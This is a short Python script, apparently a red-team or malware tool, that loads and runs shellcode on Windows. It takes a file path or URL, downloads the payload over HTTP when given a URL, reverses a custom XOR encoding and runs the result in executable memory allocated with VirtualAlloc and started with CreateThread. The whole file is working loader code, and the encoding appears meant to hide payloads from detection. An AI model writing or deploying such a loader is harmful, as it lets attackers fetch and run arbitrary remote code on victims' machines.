import ctypes
import requests
import sys


def decode(a):
    a = bytearray(a)
    for i in range(len(a)):
        if i % 5 == 0:
            a[i] ^= 12
        elif i % 3 == 0:
            a[i] ^= 6
        else:
            a[i] ^= 3
    return a

def get_shellcode(filename):
    if "http" in filename:
        resp = requests.get(filename)
        encode_shellcode = resp.content
    else:
        encode_shellcode = open(filename, "rb").read()
    decode_shellcode = (decode(encode_shellcode))
    return decode_shellcode


def run():
    # print(shellcode)
    # 设置VirtualAlloc返回类型为ctypes.c_uint64
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
    # 申请内存
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000),
                                              ctypes.c_int(0x40))

    # 放入shellcode
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    ctypes.windll.kernel32.RtlMoveMemory(
        ctypes.c_uint64(ptr),
        buf,
        ctypes.c_int(len(shellcode))
    )
    # 创建一个线程从shellcode防止位置首地址开始执行
    handle = ctypes.windll.kernel32.CreateThread(
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.c_uint64(ptr),
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.pointer(ctypes.c_int(0))
    )

    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))


if __name__ == '__main__':
    try:
        if len(sys.argv) < 2:
            print("[WRONG] input the shellcode file")
        else:
            # sys.argv = sys.argv[1:]
            sys.argv.remove(sys.argv[0])
            shellcode = get_shellcode(sys.argv[0])
            run()
    except Exception as e:
        print(e)
        pass
